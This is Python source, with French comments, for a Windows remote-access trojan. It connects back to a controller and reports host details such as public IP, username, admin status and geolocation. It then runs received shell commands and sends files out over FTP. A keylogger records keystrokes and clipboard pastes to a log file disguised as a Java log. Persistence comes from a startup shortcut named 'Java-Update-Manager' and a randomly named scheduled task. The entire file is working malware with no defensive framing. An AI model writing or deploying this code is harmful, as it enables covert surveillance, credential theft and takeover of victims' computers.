import socket
import os
import subprocess
from ctypes import *
import pythoncom
import pyHook
import ctypes
import win32clipboard
# import win32gui
from win32com.makegw.makegwparse import *
import threading
import inspect
import sys
import time
import random
import string
from ftplib import FTP

# pour la compil
import imp

def getString(length=6):
    """Générer une chaîne aléatoire de longueur fixe"""
    str = string.ascii_lowercase
    return ''.join(random.choice(str) for i in range(length))

def _async_raise(tid, exctype):
    """raises the exception, performs cleanup if needed"""
    tid = ctypes.c_long(tid)
    if not inspect.isclass(exctype):
        exctype = type(exctype)
    res = ctypes.pythonapi.PyThreadState_SetAsyncExc(
        tid, ctypes.py_object(exctype))
    if res == 0:
        raise ValueError("invalid thread id")
    elif res != 1:
        # """if it returns a number greater than one, you're in trouble,
        # and you should call it again with exc=NULL to revert the effect"""
        ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, None)
        raise SystemError("PyThreadState_SetAsyncExc failed")


class Threads:

    thread_id = 0
    thread_name = "null"

    def StartThread(self, fonction, arg1=""):
        if "Keylogger" in fonction:
            thread = threading.Thread(target=keylog.Keylog, name=fonction)
            thread.start()
        if "Commande" in fonction:
            thread = threading.Thread(
                target=payload.Commande, name=fonction, args=arg1)
            thread.start()
        self.thread_id = thread.ident
        self.thread_name = thread.name

    def StopThread(self):
        print("Arret du Thread : " + self.thread_name +
              ", numéro : " + str(self.thread_id))
        _async_raise(self.thread_id, SystemExit)


class Payload:

    host = '127.0.0.1'
    port = 4444

    SEPARATOR = "<sep>"
    BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, feel free to increase

    keylogger_mode = "null"

    result_commande = ""

    appdata = os.path.expandvars("%AppData%")
    path_keylog = appdata + "/java_logs.txt"

    def run(self):

        while True:
            conn_ok = False
            ClientSocket = socket.socket()
            print('Waiting for connection')
            name = None
            while conn_ok == False:

                try:
                    ClientSocket.connect((self.host, self.port))
                    conn_ok = True
                except socket.error as e:
                    print(str(e))
                    conn_ok = False
                    time.sleep(5 * 60)
            print("Connexion Ok")
            cwd = os.getcwd()
            ClientSocket.send(cwd.encode())
            inf = Info()
            info = [inf.platform(), inf.public_ip(), inf.local_ip(), inf.mac_address(),
                    inf.architecture(), inf.device(), inf.username(), inf.administrator(), inf.geolocation(), inf.ipv4(inf.local_ip())]
            message = f"{info[0]}{self.SEPARATOR}{info[1]}{self.SEPARATOR}{info[2]}{self.SEPARATOR}\
            {info[3]}{self.SEPARATOR}{info[4]}{self.SEPARATOR}{info[5]}{self.SEPARATOR}{info[6]}{self.SEPARATOR}\
            {info[7]}{self.SEPARATOR}{info[8]}{self.SEPARATOR}{info[9]}"
            ClientSocket.send(message.encode())

            ## attend des info supplementaire

            try:
                rep = ClientSocket.recv(self.BUFFER_SIZE).decode('utf-8', "ignore")
                if rep != "RAS":
                    name = rep
            except socket.error as e:
                print(str(e))
                break

            pers = Persistance()

            # AJOUTER LE NUMERO DE SESSION DANS LES INFO

            ##############

            ## boucle du client ##

            while True:
                # receive the command from the server
                try:
                    command = ClientSocket.recv(
                        self.BUFFER_SIZE).decode('utf-8', "ignore")
                except socket.error as e:
                    print(str(e))
                    break
                #command = ClientSocket.recv(self.BUFFER_SIZE).decode('utf-8', "ignore")
                splited_command = command.split()
                print(command)
                #output = subprocess.getoutput(command)
                # ClientSocket.send(str.encode(output))
                if command.lower() != "cat":

                    if splited_command[0].lower() == "cat":
                        path_fichier = splited_command[1]
                        output = self.Commande("type " + path_fichier)

                else:
                    output = "Cat a besoin d'une option"

                if command.lower() != "download":

                    if splited_command[0].lower() == "download":
                        #print("tentative de telechargelent de " + splited_command[1] + " " + self.host + " " + str((self.port+2)))
                        path_fichier = splited_command[1]
                        ftp = FTP('')
                        ftp.connect(self.host, (self.port+2))
                        ftp.login(user='user', passwd = '12345')
                        fichier = path_fichier
                        try:
                            file = open(fichier, 'rb') # ici, j'ouvre le fichier ftp.py 
                            try:
                                ftp.storbinary('STOR '+fichier, file) # ici (où connect est encore la variable de la connexion), j'indique le fichier à envoyer
                                output = "Fichier recupérer"
                            except:
                                output = "Erreur le fichier n'a pas été récuperé"
                        except:
                            output = "Le fichier n'éxiste pas"
                        file.close() # on ferme le fichier
                else:
                    output = "Download a besoin d'une option"

                if command.lower() != "upload":

                    if splited_command[0].lower() == "upload":
                        path_fichier = splited_command[1]
                        ftp = FTP('')
                        ftp.connect(self.host, (self.port+2))
                        ftp.login(user='user', passwd = '12345')
                        fichier = path_fichier
                        try:
                            file = open(fichier, 'wb')
                            try:
                                ftp.retrbinary('RETR '+fichier, file.write)
                                ftp.delete(fichier)
                                output = "Fichier uploader"
                            except:
                                output = "Erreur le fichier n'a pas été uploader"
                        except:
                            output = "Erreur le fichier ne peut pas etre ecrit sur le disque"
                        file.close() # on ferme le fichier
                else:
                    output = "Upload a besoin d'une option"

                if command.lower() != "keylogger":

                    if splited_command[0].lower() == "keylogger":

                        if splited_command[1].lower() == "run" and self.keylogger_mode != "run":
                            # run le keylogger
                            if self.keylogger_mode == "null":
                                self.keylogger_mode = "run"
                                output = "Keylogger Activé"
                                # lance un thread de keylog
                                thread_keylog = Threads()
                                thread_keylog.StartThread("Keylogger")
                            elif self.keylogger_mode == "stop":
                                self.keylogger_mode = "run"
                                output = "Keylogger Activé"
                        elif splited_command[1].lower() == "run" and self.keylogger_mode != "run":
                            output = "Keylogger déja Activé"

                        elif splited_command[1].lower() == "status":
                            # envoyer retour du keylogger
                            #self.keylogger_mode = "status"
                            file = open(self.path_keylog, 'r')
                            logs = file.read()
                            file.close()
                            output = logs

                        elif splited_command[1].lower() == "stop":
                            # run le keylogger
                            self.keylogger_mode = "stop"
                            # thread_keylog.StopThread()
                            output = "Keylogger Desactivé"

                else:
                    output = "Keylogger a besoin d'une option"

                if command.lower() != "persistance":

                    if splited_command[0].lower() == "persistance":

                        if splited_command[1].lower() == "auto":
                            print("Persistance automatique")
                            output = "Persistance automatique"

                        elif splited_command[1].lower() == "startup":
                            result, code = pers._add_startup_file()
                            if result == False and code == "deja mise":
                                print("Persistance via dossier startup déja activé")
                                output = "Persistance via dossier startup déja activé"
                            if result == False and code == "error":
                                print(
                                    "Persistance via dossier startup a rencontrer une erreur")
                                output = "Persistance via dossier startup a rencontrer une erreur"
                            if result == True:
                                print("Persistance via dossier startup activé")
                                output = "Persistance via dossier startup activé"

                        elif splited_command[1].lower() == "powershell":
                            print("Persistance via powershell")
                            output = "Persistance via powershell"

                        elif splited_command[1].lower() == "task":
                            print("Persistance via tache planifié")
                            print(name)
                            if name == None:
                                result, code = pers._add_scheduled_task()
                            else:
                                result, code = pers._add_scheduled_task(name=name)
                            if result == True:
                                print("Persistance via tache planifié activé")
                                output = "Persistance tache planifié activé" + code
                                name = code
                                print(code)
                            if result == False:
                                print(
                                    "Persistance via tache planifié a rencontrer une erreur")
                                output = "Persistance tache planifié a rencontrer une erreur : " + code

                else:
                    output = "Persistance a besoin d'une option"

                if command.lower() == "kill":
                    # si la commande est kill, ferme le programmes
                    os._exit(0)
                if splited_command[0].lower() == "cd":
                    # cd command, change directory
                    try:
                        os.chdir(' '.join(splited_command[1:]))
                    except FileNotFoundError as e:
                        # if there is an error, set as the output
                        output = str(e)
                    else:
                        # if operation is successful, empty message
                        output = ""
                elif splited_command[0].lower() != "keylogger" and splited_command[0].lower() != "persistance" \
                    and splited_command[0].lower() != "cat" and splited_command[0].lower() != "download" \
                        and splited_command[0].lower() != "upload":
                    # execute the command and retrieve the results

                    """
                    thread = threading.Thread(target=Commande, args=(command,))
                    thread.start()
                    thread.join()
                    """

                    output = self.Commande(command)

                    print("commande effectuer")
                    """"
                    resCmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,)
                    output, err = resCmd.communicate()
                    output = output.decode('cp850')
                    """

                # get the current working directory as output
                cwd = os.getcwd()
                # send the results back to the server
                message = f"{output}{self.SEPARATOR}{cwd}"
                ClientSocket.send(message.encode('utf-8'))
                print("Resultat Envoyer")

                #Input = input('Say Something: ')
                # ClientSocket.send(str.encode(Input))
                #Response = ClientSocket.recv(1024)
                # print(Response.decode('utf-8'))

            ## Fin de Connection ##

            ClientSocket.close()

    def LaunchThread(self, fonction, arg1=""):
        print(fonction)
        t = Threads()
        t.StartThread(fonction, arg1)
        return t

    def Commande(self, cmd):
        resCmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                  stdin=subprocess.DEVNULL, stderr=subprocess.PIPE,)
        output, err = resCmd.communicate()
        output = output.decode('cp850')
        payload.result_commande = output
        return output


class Keylogger:

    user32 = windll.user32
    kernel32 = windll.kernel32
    psapi = windll.psapi
    current_window = None
    appdata = os.path.expandvars("%AppData%")
    path_keylog = appdata + "/java_logs.txt"

    def Keylog(self):

        # create and register a hook manager
        k1 = pyHook.HookManager()
        k1.KeyDown = self.Keystroke
        # register the hook and execute forever
        k1.HookKeyboard()
        pythoncom.PumpMessages()
        print("Fin du keylogger")

        ## Fonction keylloger ##

    def get_current_process(self):
        # Get a handle to the foreground window
        hwnd = self.user32.GetForegroundWindow()
        print("hwnd", hwnd)
        # Find Process id
        pid = c_ulong()
        print("pid", pid)
        self.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        # store the current process ID
        process_id = pid.value
        print("processid", process_id)
        # grab the executable
        executable = create_string_buffer(b'\x00', 512)
        h_process = self.kernel32.OpenProcess(0x400 | 0x10, False, pid)
        self.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
        # now read its title
        window_title = create_string_buffer(b"\x00", 512)
        print(window_title, executable, process_id, hwnd)
        length = self.user32.GetWindowTextA(hwnd, byref(window_title), 512)

        # w = win32gui
        # z=w.GetWindowText(w.GetForegroundWindow())
        # print out the header if we're in the right process
        print()
        print("PID : %s - %s - %s" %
              (process_id, executable.value, window_title.value))
        var = "PID : %s - %s - %s" % (process_id,
                                      executable.value, window_title.value)
        file = open(self.path_keylog, 'a')
        file.write("\n%s\n" % var)
        file.close()
        print()
        # close handles
        self.kernel32.CloseHandle(hwnd)
        self.kernel32.CloseHandle(h_process)

    def Keystroke(self, event):
        # Couper le keylogger
        if payload.keylogger_mode == "stop":
            """
            pid = os.getpid()
            resCmd = subprocess.Popen("taskkill /F /PID " + str(pid), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,)
            output, err = resCmd.communicate()
            output = output.decode('cp850')
            print(output)
            """
            # ctypes.windll.self.user32.PostQuitMessage(0)
            return True
            # exit()
        # check to see if target changed windows
        if event.WindowName != self.current_window:
            self.current_window = event.WindowName
            self.get_current_process()
        # if they pressed a standard key
        if event.Ascii in range(32, 128):
            print(chr(event.Ascii))
            h = chr(event.Ascii)
            file = open(self.path_keylog, 'a')
            file.write("%s" % h)
            file.close()
        else:
            # if [CTRL-V] ,get the value on the clipboard
            if event.Key == "V":
                win32clipboard.OpenClipboard()
                pasted_value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print("[PASTE] - {0}".format(pasted_value))
                file = open(self.path_keylog, 'a')
                file.write("\n[PASTE] - {0}\n".format(pasted_value))
                file.close()
            else:
                print("{0}".format(event.Key))
                file = open(self.path_keylog, 'a')
                file.write("{0}".format(event.Key))
                file.close()
        # pass execution to next hook registered
        return True


class Persistance:

    def _add_startup_file(self, value=None, name='Java-Update-Manager'):
        try:
            if os.name == 'nt':
                value = sys.argv[0]
                if value and os.path.isfile(value):
                    appdata = os.path.expandvars("%AppData%")
                    startup_dir = os.path.join(
                        appdata, r'Microsoft\Windows\Start Menu\Programs\Startup')
                    if not os.path.exists(startup_dir):
                        os.makedirs(startup_dir)
                    startup_file = os.path.join(
                        startup_dir, '%s.eu.url' % name)
                    content = '\n[InternetShortcut]\nURL=file:///%s\n' % value
                    if not os.path.exists(startup_file) or content != open(startup_file, 'r').read():
                        with open(startup_file, 'w') as fp:
                            print("persis mise")
                            fp.write(content)
                    else:
                        print("persis deja mise")
                        return (False, "deja mise")
                    return (True, startup_file)
        except Exception as e:
            print('{} error: {}'.format(self._add_startup_file.__name__, str(e)))
        return (False, "error")

    def _add_scheduled_task(self, value=None, name=None):
        try:
            value = sys.argv[0]
            if name == None:
                name  = getString(random.randint(6,11))
            if value and os.path.isfile(value):
                result  = subprocess.check_output('SCHTASKS /CREATE /TN {} /TR {} /SC hourly /F'.format(name, value), shell=True)
                result = result.decode("cp850")
                if 'SUCCESS' in result or 'réussie' in result:
                    print(result)
                    return (True, name)
        except Exception as e:
            print('Add scheduled task error: {}'.format(str(e)))
            err = e
        return (False, "Erreur : " + err)


class Info:

    def platform(self):
        """
        Return the system platform of host machine
        """
        import sys
        return sys.platform

    def public_ip(self):
        """
        Return public IP address of host machine
        """
        import sys
        if sys.version_info[0] > 2:
            from urllib.request import urlopen
        else:
            from urllib import urlopen
        return urlopen('http://api.ipify.org').read()

    def local_ip(self):
        """
        Return local IP address of host machine
        """
        import socket
        return socket.gethostbyname(socket.gethostname())

    def mac_address(self):
        """
        Return MAC address of host machine
        """
        import uuid
        return ':'.join(hex(uuid.getnode()).strip('0x').strip('L')[i:i+2] for i in range(0, 11, 2)).upper()

    def architecture(self):
        """
        Check if host machine has 32-bit or 64-bit processor architecture
        """
        import struct
        return int(struct.calcsize('P') * 8)

    def device(self):
        """
        Return the name of the host machine
        """
        import socket
        return socket.getfqdn(socket.gethostname())

    def username(self):
        """
        Return username of current logged in user
        """
        import os
        return os.getenv('USER', os.getenv('USERNAME', 'user'))

    def administrator(self):
        """
        Return True if current user is administrator, otherwise False
        """
        import os
        import ctypes
        return bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name == 'nt' else os.getuid() == 0)

    def geolocation(self):
        """
        Return latitute/longitude of host machine (tuple)
        """
        import sys
        import json
        if sys.version_info[0] > 2:
            from urllib.request import urlopen
        else:
            from urllib2 import urlopen
        response = urlopen('http://ipinfo.io').read()
        json_data = json.loads(response)
        latitude, longitude = json_data.get('loc').split(',')
        return (latitude, longitude)

    def ipv4(self, address):
        """
        Check if valid IPv4 address
        `Required`
        :param str address:   string to check
        Returns True if input is valid IPv4 address, otherwise False
        """
        import socket
        try:
            if socket.inet_aton(str(address)):
                return True
        except:
            return False


payload = Payload()
keylog = Keylogger()
payload.run()
